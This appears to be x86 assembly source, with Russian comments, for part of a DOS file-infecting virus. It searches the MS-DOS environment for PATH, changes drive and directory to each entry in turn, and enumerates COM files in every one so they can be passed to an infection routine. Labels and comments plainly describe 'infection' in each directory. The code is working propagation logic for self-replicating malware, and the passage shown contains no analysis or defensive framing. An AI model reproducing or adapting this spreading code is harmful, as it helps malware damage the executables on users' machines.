;**** ПОИСК СТРОКИ В ПАМЯТИ ********************************************
;----------------------------
;ВХОД:
;DS:SI - АДРЕС ИСКОМОЙ СТРОКИ
;ES:DI - АДРЕС ДЛЯ ПОИСКА
;CX - КОЛИЧЕСТВО БАЙТ ДЛЯ СРАВНЕНИЯ
;BX - ДЛИНА ИСКОМОЙ СТРОКИ
;ВЫХОД:
;DI    - СМЕЩЕНИЕ В СЕГМЕНТЕ ЕСЛИ НАШЛИ, В ПРОТИВНОМ СЛУЧАЕ 0FFFFH
;----------------------------
CONCATENAT_STRING_IN_MEMORY:
             PUSH AX
             PUSH DX
             CLD
             MOV AL,BYTE PTR DS:[SI] ;ПЕРВЫЙ СИМВОЛ ИСКОМОЙ СТРОКИ
NEXT_FIND_STRING:
             REPNE SCASB             ;найти первый подходящий символ
             JE FOUND_FIRST_CHAR     ;нашли
             MOV DI,0FFFFH           ;метка того, что символ не найден
             JMP END_FIND_STRING     ;выйти

FOUND_FIRST_CHAR:
             PUSH CX
             PUSH DI
             PUSH SI                 ;сохранить текущие значения
             MOV CX,BX
             DEC DI
             REPE CMPSB              ;сравнить найденное слово с искомым

             JE FOUND_STRING         ;искомая строка найдена
             POP SI
             POP DI
             POP CX                  ;восстановить текущие значения

             JMP NEXT_FIND_STRING    ;поиск продолжается
FOUND_STRING:
             POP SI                  ;возврат из подпрограммы
             POP DI
             DEC DI

             POP CX
END_FIND_STRING:
             POP AX
             POP DX
             RET


;************* ДИСПЕТЧЕР ПОИСКА ФАЙЛОВ **************************
FILE_MENAGER:
             LEA SI,PATH
             MOV BX,PATH_LEN  ;длина строки поиска
             mov cx,0ffh      ;размер области поиска
             MOV AX,CS:[2CH]
             MOV ES,AX        ;получить сегмент окружения MSDOS
             XOR DI,DI        ;искать с начала сегмента
             CALL CONCATENAT_STRING_IN_MEMORY  ;вызов подпрограммы поика
             CMP DI,0FFFFH    ;область не найдена?
             JNZ OK_2         ;найдена
             JMP NOT_FOUND_2  ;вернуться в программу
OK_2:
             XCHG DI,SI       ;переслать адрес строки в SI
             ADD SI,PATH_LEN  ;перейти на первый символ после найденной строки
             CALL INSPECT_PATH ;вызвать процедуру обработки

NOT_FOUND_2:
RET


;************* ПОИСК В ТЕКУЩЕМ КАТАЛОГЕ *************************
FIND_CURRENT_DIR:
         PUSH ES
         PUSH DS            ;сохранить сегментные регистры
         DB 60H             ;сохранить регистры общего назначения
         PUSH CS
         POP DS             ;данные в сегменте кода
         MOV AH,4EH         ;функция поиска первого файла
         MOV CX,20H         ;маска атрибутов
         LEA DX,COM_MASK    ;адрес маски файлов
INTERRUPT:
         INT 21H
         JC RETURN_FROM_INFECTED ;файл не найден
         CALL UKOL               ;обработать файл
         MOV AH,4FH              ;функция поиска следующего файла
         JMP SHORT INTERRUPT
RETURN_FROM_INFECTED:
         DB 61H                  ;достать регистры
         POP DS
         POP ES
NOT_INFECTED:
         RET                     ;выход из подпрограммы



;************* ПОИСК ПО PATH ************************************
INSPECT_PATH:
    MOV AH,19H
    INT 21H                      ;определить текущий дисковод
    MOV BYTE PTR CS:[DRIVE],AL ;сохранить это значение
    CMP AL,2                     ;это первый жесткий диск?
    JZ HDD_FIND                  ;да. провести поиск по PATH
ERROR_PATH:
    RET                          ;выход из подпрограммы
HDD_FIND:
    PUSH ES
    POP DS                       ;в DS сегмент окружения MS DOS
    CALL FIND_CURRENT_DIR        ;провести заражение в текущем каталоге
LOOP_FIND:
    PUSH ES
    POP DS                       ;в DS сегмент окружения MS DOS
    MOV AH,19H
    INT 21H                      ;определить текущий дисковод
    MOV DL,BYTE PTR [SI]         ;получить символ дисковода из PATH
    OR DL,00100000B              ;перевести в строчный символ
    SUB DL,65                    ;перевести в цифру
    CMP DL,AL                    ;сравнить дисководы
    JZ CHANGE_DIR                ;можно установить новый каталог текущим
CHANGE_DRIVE:                    ;изменить текущий дисковод
    MOV BYTE PTR CS:[DRIVE],DL   ;запомнить новое устройство
    MOV AH,0EH
    INT 21H                      ;запрос на установку устройства текущим
CHANGE_DIR:
    LEA BX,CPATH                 ;установить начало имени каталога
LOOP_ZERRO_PATH:
    MOV DL,BYTE PTR [SI]         ;получить символ из имени каталога
    CMP DL,0H                    ;это последний символ PATH?
    JZ ERROR_PATH                ;да. закончить поиск каталогов
    CMP DL,';'                   ;это последний символ в имени каталога?
    JNZ NEXT_SYM                 ;нет
    MOV DL,0H                    ;да. сделать его нулевым
NEXT_SYM:
    MOV BYTE PTR CS:[BX],DL      ;сохранить символ имени каталога
    INC SI                       ;увеличить счетчик источника
    INC BX                       ;увеличить счетчик приемника
    CMP DL,0H                    ;это последний символ имени?
    JZ END_PATH                  ;да. закончить калькулирование
    JMP LOOP_ZERRO_PATH          ;не вышли. взять следущий символ
END_PATH:
    MOV AH,3BH
    PUSH CS
    POP DS
    LEA DX,CPATH
    INT 21H                      ;установить каталог текущим
    CMP AX,0                     ;нет ошибки?
    JZ PLAQUE                    ;перейти л поиску
    JMP LOOP_FIND                ;каталог недоступен. поиск следущего
PLAQUE:
    CALL FIND_CURRENT_DIR        ;поиск файлов в каталоге
    JMP LOOP_FIND                ;поиск следущего каталога
